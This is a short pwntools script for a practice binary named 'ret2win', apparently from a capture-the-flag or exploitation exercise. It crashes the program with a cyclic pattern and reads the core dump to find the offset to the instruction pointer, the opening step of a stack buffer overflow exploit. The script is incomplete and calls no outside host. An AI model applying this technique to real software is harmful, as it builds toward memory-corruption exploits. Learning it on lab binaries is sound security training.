#!/bin/python3

from pwn import *

elf = context.binary = ELF('./ret2win', checksec= False)

"""def offset():
    io = process()
   """

#io = process()
#c = io.corefile

def offset(payload):
    io = process()
    
    io.sendline(payload)
    io.wait()

    off = cyclic_find(io.corefile.pc) #x86
    #off = cyclic_find(io.corefile.read(io.corefile.sp, 4)) x64
    
    print('We have offser RIP/EIP offset at {i}'.format(i=off))
    print(io.corefile.pc)
    io.close()
    return off


#io.close()


def main():
    offset(cyclic(100))


